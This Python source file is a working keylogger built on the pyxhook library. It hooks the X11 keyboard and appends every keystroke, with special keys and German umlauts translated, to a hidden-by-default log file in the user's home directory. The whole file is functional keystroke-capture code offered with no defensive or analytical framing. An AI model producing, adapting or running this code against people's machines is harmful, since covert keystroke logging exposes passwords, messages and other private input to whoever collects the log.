import os
import pyxhook

log_file = os.environ.get(
	'pylogger_file',
	os.path.expanduser('~/file.log')
)


def on_key_press(event):
	with open(log_file, 'a') as f:
		if len(event.Key) == 1:
			f.write('{}'.format(event.Key))
		elif event.Key == "space":
			f.write(' ')
		elif event.Key == "Return":
			f.write('\n')
		elif event.Key == "Tab":
			f.write('[TAB]')
		elif event.Key == "quotedbl":
			f.write('"')
		elif event.Key == "odiaeresis":
			f.write('ö')
		elif event.Key == "adiaeresis":
			f.write('ä')
		elif event.Key == "udiaeresis":
			f.write('ü')
		elif event.Key == "period":
			f.write('.')
		elif event.Key == "parentleft":
			f.write('(')
		elif event.Key == "parentright":
			f.write(')')
		else:
			if "Shift" not in event.Key and "Alt" not in event.Key:
				f.write('\n{}\n'.format(event.Key))


new_hook = pyxhook.HookManager()
new_hook.KeyDown = on_key_press
new_hook.HookKeyboard()
new_hook.start()
